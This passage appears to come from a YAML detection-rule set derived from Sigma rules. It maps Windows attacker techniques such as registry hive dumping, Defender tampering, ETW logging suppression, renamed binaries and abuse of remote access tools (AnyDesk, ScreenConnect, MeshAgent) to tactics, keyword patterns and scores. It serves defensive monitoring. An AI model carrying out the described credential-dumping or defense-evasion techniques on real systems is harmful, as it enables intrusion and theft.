      regex_any:
      - suspicious
      - bitlocker
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7966f4a_b333_455b_8370_8ca53c229762
  intent: credential_harvesting
  tactic: credential_access
  description: Detects dropping of dll files in system32 that may be used to retrieve
    user credentials from LSASS
  conditions:
    summary:
      regex_any:
      - dropping
      - password
      - filter
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48917adc_a28e_4f5d_b729_11e75da8941f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of "reg.exe" to add Defender folder exclusions. Qbot
    has been seen using this technique to add exclusions for folders within AppData
    and ProgramData.
  conditions:
    summary:
      regex_any:
      - suspicious
      - windows
      - defender
      - folder
      - exclusion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c11aecef_9c37_45a6_9c07_bc0782f963fd
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects deletion of the RunMRU registry key, which stores the history
    of commands executed via the Run dialog.

    In the clickfix techniques, the phishing lures instruct users to open a run dialog
    through (Win + R) and execute malicious commands.

    Adversaries may delete this key to cover their tracks after executing commands.

    '
  conditions:
    summary:
      regex_any:
      - runmru
      - registry
      - deletion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fc0e89b5_adb0_43c1_b749_c12a10ec37de
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "reg.exe" commands with the "delete" flag on safe
    boot registry keys. Often used by attacker to prevent safeboot execution of security
    products
  conditions:
    summary:
      regex_any:
      - safeboot
      - registry
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05b2aa93_1210_42c8_8d9a_2fcc13b284f5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "reg.exe" commands with the "delete" flag on services
    registry key. Often used by attacker to remove AV software services
  conditions:
    summary:
      regex_any:
      - service
      - registry
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8cbc9475_8d05_4e27_9c32_df960716c701
  intent: impact_operations
  tactic: impact
  description: 'Detects the execution of "reg.exe" to alter registry keys that would
    replace the user''s desktop background.

    This is a common technique used by malware to change the desktop background to
    a ransom note or other image.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - desktop
      - background
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_24357373_078f_44ed_9ac4_6d334a668a11
  intent: persistence_installation
  tactic: persistence
  description: Detects direct modification of autostart extensibility point (ASEP)
    in registry using reg.exe.
  conditions:
    summary:
      regex_any:
      - direct
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a1b2c3d4_e5f6_a7b8_c9d0_e1f2a3b4c5d6
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of reg.exe to disable the Event Tracing for Windows
    (ETW) Autologger session for Windows Defender API and Audit events.

    By setting the ''Start'' value to ''0'' for the ''DefenderApiLogger'' or ''DefenderAuditLogger''
    session, an attacker can prevent these critical security events

    from being logged, effectively blinding monitoring tools that rely on this data.
    This is a powerful defense evasion technique.

    '
  conditions:
    summary:
      regex_any:
      - disabling
      - windows
      - defender
      - autologger
      - session
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5e95028c_5229_4214_afae_d653d573d0ec
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "reg.exe" to disable security services such as
    Windows Defender.
  conditions:
    summary:
      regex_any:
      - security
      - service
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fd877b94_9bb5_4191_bb25_d79cbd93c167
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the usage of "reg.exe" in order to dump sensitive registry
    hives. This includes SAM, SYSTEM and SECURITY hives.
  conditions:
    summary:
      regex_any:
      - dumping
      - sensitive
      - hives
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_817f252c_5143_4dae_b418_48c3e9f63728
  intent: data_staging
  tactic: collection
  description: 'Detects the enabling of the Windows Recall feature via registry manipulation.

    Windows Recall can be enabled by deleting the existing "DisableAIDataAnalysis"
    value, or setting it to 0.

    Adversaries may enable Windows Recall as part of post-exploitation discovery and
    collection activities.

    This rule assumes that Recall is already explicitly disabled on the host, and
    subsequently enabled by the adversary.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - recall
      - feature
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0b0c2ab_3d52_46d9_8cb7_049dc775fbd1
  intent: credential_harvesting
  tactic: credential_access
  description: 'Adversaries may search the Registry on compromised systems for insecurely
    stored credentials.

    The Windows Registry stores configuration information that can be used by the
    system or other programs.

    Adversaries may query the Registry looking for credentials and passwords that
    have been stored for use by other programs or services

    '
  conditions:
    summary:
      regex_any:
      - enumeration
      - credentials
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_62e0298b_e994_4189_bc87_bc699aa62d97
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the import of '.reg' files from suspicious paths using the
    'reg.exe' utility
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - registry
      - file
      - imported
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_28ac00d6_22d9_4a3c_927f_bbd770104573
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the "DisableRestrictedAdmin" registry value in
    order to disable or enable RestrictedAdmin mode.

    RestrictedAdmin mode prevents the transmission of reusable credentials to the
    remote system to which you connect using Remote Desktop.

    This prevents your credentials from being harvested during the initial connection
    process if the remote server has been compromise

    '
  conditions:
    summary:
      regex_any:
      - restrictedadminmode
      - registry
      - value
      - tampering
      - proccreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8c0eca51_0f88_4db2_9183_fdfb10c703f9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of the "reg.exe" utility to disable PPL protection
    on the LSA process
  conditions:
    summary:
      regex_any:
      - protection
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ada4b0c4_758b_46ac_9033_9004613a150d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detect malicious GPO modifications can be used to implement many other
    malicious behaviors.
  conditions:
    summary:
      regex_any:
      - modify
      - group
      - policy
      - settings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_98dedfdd_8333_49d4_9f23_d7018cccae53
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the "NoLMHash" registry value in order to allow
    Windows to store LM Hashes.

    By setting this registry value to "0" (DWORD), Windows will be allowed to store
    a LAN manager hash of your password in Active Directory and local SAM databases.

    '
  conditions:
    summary:
      regex_any:
      - enable
      - hash
      - storage
      - proccreation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dd3ee8cc_f751_41c9_ba53_5a32ed47e563
  intent: credential_harvesting
  tactic: credential_access
  description: Threat actors performed dumping of SAM, SECURITY and SYSTEM registry
    hives using DelegateExecute key
  conditions:
    summary:
      regex_any:
      - suspicious
      - open
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_970007b7_ce32_49d0_a4a4_fbef016950bd
  intent: reconnaissance
  tactic: discovery
  description: Detects the usage of "reg.exe" in order to query reconnaissance information
    from the registry. Adversaries may interact with the Windows registry to gather
    information about credentials, the system, configuration, and installed software.
  conditions:
    summary:
      regex_any:
      - potential
      - configuration
      - service
      - reconnaissance
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0d5675be_bc88_4172_86d3_1e96a4476536
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the execution of "reg.exe" for enabling/disabling the RDP service
    on the host by tampering with the 'CurrentControlSet\Control\Terminal Server'
    values
  conditions:
    summary:
      regex_any:
      - potential
      - tampering
      - with
      - related
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0fc35fc3_efe6_4898_8a37_0b233339524f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Adversaries may establish persistence by executing malicious content
    triggered by user inactivity.

    Screensavers are programs that execute after a configurable time of user inactivity
    and consist of Portable Executable (PE) files with a .scr file extension

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - screensave
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9b0b7ac3_6223_47aa_a3fd_e8f211e637db
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may execute their own malicious payloads by hijacking
    the Registry entries used by services.

    Adversaries may use flaws in the permissions for registry to redirect from the
    originally specified executable to one that they control, in order to launch their
    own code at Service start.

    Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services

    '
  conditions:
    summary:
      regex_any:
      - changing
      - existing
      - service
      - imagepath
      - value
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e13f668e_7f95_443d_98d2_1816a7648a7b
  intent: reconnaissance
  tactic: discovery
  description: Adversaries may attempt to enumerate software for a variety of reasons,
    such as figuring out what security measures are present or if the compromised
    system has a version of software that is vulnerable.
  conditions:
    summary:
      regex_any:
      - detected
      - windows
      - software
      - discovery
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7e2a8d4_74bb_4b78_adc9_3f92af2d4829
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an adversary uses the reg.exe utility to add or modify
    new keys or subkeys
  conditions:
    summary:
      regex_any:
      - suspicious
      - paths
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dee4af55_1f22_4e1d_a9d2_4bdc7ecb472a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects commands that temporarily turn off Volume Snapshots
  conditions:
    summary:
      regex_any:
      - disabled
      - volume
      - snapshots
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_452bce90_6fb0_43cc_97a5_affc283139b3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the usage of "reg.exe" to tamper with different Windows Defender
    registry keys in order to disable some important features related to protection
    and detection

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - windows
      - defender
      - registry
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75f7a0e2_7154_4c4d_9eae_5cdb4e0a5c13
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects applications trying to modify the registry in order to disable
    any write-protect property for storage devices.

    This could be a precursor to a ransomware attack and has been an observed technique
    used by cypherpunk group.

    '
  conditions:
    summary:
      regex_any:
      - write
      - protect
      - storage
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b52e84a3_029e_4529_b09b_71d19dd27e94
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - anydesk
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1377339_fda6_477a_b455_ac0923f9ec2c
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects piping the password to an anydesk instance via CMD and the
    '--set-password' flag.
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - anydesk
      - piped
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_114e7f1c_f137_48c8_8f54_3088c24ce4b9
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects AnyDesk Remote Desktop silent installation. Which can be used
    by attackers to gain remote access.
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - anydesk
      - silent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_065b00ca_5d5c_4557_ac95_64a6d0b64d86
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - anydesk
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6d98a4f_cef0_4abf_bbf6_24132854a83d
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - gotoassist
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d85873ef_a0f8_4c48_a53a_6b621f11729d
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - logmein
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2fbbe9ff_0afc_470b_bdc0_592198339968
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects potential execution of MeshAgent which is a tool used for
    remote access.

    Historical data shows that threat actors rename MeshAgent binary to evade detection.

    Matching command lines with the ''--meshServiceName'' argument can indicate that
    the MeshAgent is being used for remote access.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - potential
      - meshagent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_74a2b202_73e0_4693_9a3a_9d36146d0775
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the use of MeshAgent to execute commands on the target host,
    particularly when threat actors might abuse it to execute commands directly.

    MeshAgent can execute commands on the target host by leveraging win-console to
    obscure their activities and win-dispatcher to run malicious code through IPC
    with child processes.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - meshagent
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_758ff488_18d5_4cbe_8ec4_02b6285a434f
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - netsupport
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_37e8d358_6408_4853_82f4_98333fca7014
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of client32.exe (NetSupport RAT) from an unusual
    location (outside of 'C:\Program Files')
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - netsupport
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b471f462_eb0d_4832_be35_28d94bdb4780
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of a renamed instance of the Remote Monitoring
    and Management (RMM) tool, MeshAgent.

    RMM tools such as MeshAgent are commonly utilized by IT administrators for legitimate
    remote support and system management.

    However, malicious actors may exploit these tools by renaming them to bypass detection
    mechanisms, enabling unauthorized access and control over compromised systems.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - renamed
      - meshagent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e01fa958_6893_41d4_ae03_182477c5e77d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of Remote Utilities RAT (RURAT) from an unusual location
    (outside of 'C:\Program Files')
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - rurat
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_57bff678_25d1_4d6c_8211_8ca106d12053
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - screenconnect
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75bfe6e6_cd8e_429e_91d3_03921e1d7962
  intent: unknown
  tactic: initial_access
  description: Detects ScreenConnect program starts that establish a remote access
    to a system.
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - screenconnect
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b582f1a_b318_4c6a_bf4e_66fe49bf55a5
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects potentially suspicious child processes launched via the ScreenConnect
    client service.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - screenconnect
      - potential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b19146a3_25d4_41b4_928b_1e2a92641b1b
  intent: unknown
  tactic: initial_access
  description: Detects potential web shell execution from the ScreenConnect server
    process.
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - screenconnect
      - server
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_95e60a2b_4705_444b_b7da_ba0ea81a3ee2
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - simple
      - help
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2db93a3f_3249_4f73_9e68_0e77a0f8ae7e
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects TacticalRMM agent installations where the --api, --auth, and
    related flags are used on the command line.

    These parameters configure the agent to connect to a specific RMM server with
    authentication, client ID, and site ID.

    This technique could indicate a threat actor attempting to register the agent
    with an attacker-controlled RMM infrastructure silently.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - tacticalrmm
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_88656cec_6c3b_487c_82c0_f73ebb805503
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - ultraviewer
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_df55196f_f105_44d3_a675_e9dfb6cc2f2b
  intent: reconnaissance
  tactic: discovery
  description: Detects the use of a renamed Adfind.exe. AdFind continues to be seen
    across majority of breaches. It is used to domain trust discovery to plan out
    subsequent steps in the attack chain.
  conditions:
    summary:
      regex_any:
      - renamed
      - adfind
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f16d9cf_0616_45c8_8fad_becc11b5a41c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of a renamed autohotkey.exe binary based on PE metadata
    fields
  conditions:
    summary:
      regex_any:
      - renamed
      - autohotkey
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f4264e47_f522_4c38_a420_04525d5b880f
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of a renamed AutoIt2.exe or AutoIt3.exe.

    AutoIt is a scripting language and automation tool for Windows systems. While
    primarily used for legitimate automation tasks, it can be misused in cyber attacks.

    Attackers can leverage AutoIt to create and distribute malware, including keyloggers,
    spyware, and botnets. A renamed AutoIt executable is particularly suspicious.

    '
  conditions:
    summary:
      regex_any:
      - renamed
      - autoit
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36480ae1_a1cb_4eaa_a0d6_29801d7e9142
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed binary often used by attackers or
    malware leveraging new Sysmon OriginalFileName datapoint.
  conditions:
    summary:
      regex_any:
      - potential
      - defense
      - evasion
      - binary
      - rename
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ba1da6d_b6ce_4366_828c_18826c9de23e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed binary often used by attackers or
    malware leveraging new Sysmon OriginalFileName datapoint.
  conditions:
    summary:
      regex_any:
      - potential
      - defense
      - evasion
      - rename
      - highly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_30d07da2_83ab_45d8_ae75_ec7c0edcaffc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed BOINC binary.
  conditions:
    summary:
      regex_any:
      - renamed
      - boinc
      - client
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a4519e8_e64a_40b6_ae85_ba8ad2177559
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects process creation with a renamed BrowserCore.exe (used to extract
    Azure tokens)
  conditions:
    summary:
      regex_any:
      - renamed
      - browsercore
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0c69ebd_b54f_4aed_8ae3_e3467843f3f0
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the execution of a renamed "cloudflared" binary.
  conditions:
    summary:
      regex_any:
      - renamed
      - cloudflared
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a1ed54a_2ba4_4221_94d5_01dee560d71e
  intent: credential_harvesting
  tactic: credential_access
  description: Detects uses of a renamed legitimate createdump.exe LOLOBIN utility
    to dump process memory
  conditions:
    summary:
      regex_any:
      - renamed
      - createdump
      - utility
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7530cd3d_7671_43e3_b209_976966f6ea48
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed "CURL.exe" binary based on the PE
    metadata fields
  conditions:
    summary:
      regex_any:
      - renamed
      - curl
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_340a090b_c4e9_412e_bb36_b4b16fe96f9b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a renamed "dctask64.exe" execution, a signed binary by ZOHO
    Corporation part of ManageEngine Endpoint Central.

    This binary can be abused for DLL injection, arbitrary command and process execution.

    '
  conditions:
    summary:
      regex_any:
      - renamed
      - zoho
      - dctask64
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_277a4393_446c_449a_b0ed_7fdc7795244c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed "ftp.exe" binary based on the PE
    metadata fields
  conditions:
    summary:
      regex_any:
      - renamed
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec0722a3_eb5c_4a56_8ab2_bf6f20708592
  intent: impact_operations
  tactic: impact
  description: Detects the execution of a renamed "gpg.exe". Often used by ransomware
    and loaders to decrypt/encrypt data.
  conditions:
    summary:
      regex_any:
      - renamed
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_edd8a48c_1b9f_4ba1_83aa_490338cd1ccb
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed "jusched.exe" as seen used by the
    cobalt group
  conditions:
    summary:
      regex_any:
      - renamed
      - jusched
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6474a1b_5390_49cd_ab41_8d88655f7394
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the execution of a renamed version of the "Mavinject" process.
    Which can be abused to perform process injection using the "/INJECTRUNNING" flag
  conditions:
    summary:
      regex_any:
      - renamed
      - mavinject
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_643bdcac_8b82_49f4_9fd9_25a90b929f3b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed MegaSync.exe as seen used by ransomware
    families like Nefilim, Sodinokibi, Pysa, and Conti.
  conditions:
    summary:
      regex_any:
      - renamed
      - megasync
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bd1c6866_65fc_44b2_be51_5588fcff82b9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed "Msdt.exe" binary
  conditions:
    summary:
      regex_any:
      - renamed
      - msdt
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_88f46b67_14d4_4f45_ac2c_d66984f22191
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed Microsoft Teams binary.
  conditions:
    summary:
      regex_any:
      - renamed
      - microsoft
      - teams
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0afbd410_de03_4078_8491_f132303cb67d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed "client32.exe" (NetSupport RAT)
    via Imphash, Product and OriginalFileName strings
  conditions:
    summary:
      regex_any:
      - renamed
      - netsupport
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_264982dc_dbad_4dce_b707_1e0d3e0f73d9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed "NirCmd.exe" binary based on the
    PE metadata fields.
  conditions:
    summary:
      regex_any:
      - renamed
      - nircmd
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b0cd537_fc77_4e6e_a973_e53495c1083d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed office binary
  conditions:
    summary:
      regex_any:
      - renamed
      - office
      - binary
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4e49831_1496_40cf_8ce1_b53f942b02f9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of renamed version of PAExec. Often used by attackers
  conditions:
    summary:
      regex_any:
      - renamed
      - paexec
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2433a154_bb3d_42e4_86c3_a26bdac91c45
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed "PingCastle" binary based on the
    PE metadata fields.
  conditions:
    summary:
      regex_any:
      - renamed
      - pingcastle
      - binary
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c12727d_02bf_45ff_a9f3_d49806a3cf43
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of a renamed version of the Plink binary
  conditions:
    summary:
      regex_any:
      - renamed
      - plink
      - execution
  weights:
    base: 0.6
